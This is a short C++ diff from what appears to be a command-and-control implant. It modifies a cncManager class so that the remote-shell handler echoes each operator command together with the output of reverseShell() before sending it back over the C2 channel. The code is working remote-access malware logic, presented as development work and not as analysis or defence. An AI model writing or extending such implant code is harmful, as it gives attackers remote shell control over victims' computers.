@@ -202,7 +202,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             {
                 case ACK:
                 {
-                    //this->printParsedResponse(resData, "ACK");
+                    // this->printParsedResponse(resData, "ACK");
                     break;
                 }
 
@@ -307,9 +307,13 @@ void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
 void cncManager::handleShellRequest() {
     std::lock_guard<std::mutex> guard(this->m2);
     commandManager commander;
+
     std::string result;
         while (!this->shellCmd.empty()) {
-            result = commander.reverseShell(this->shellCmd.front());
+            std::string command = this->shellCmd.front();
+
+            result = command + "\n";
+            result += commander.reverseShell(command);
             this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
             this->shellCmd.pop_front();
         }
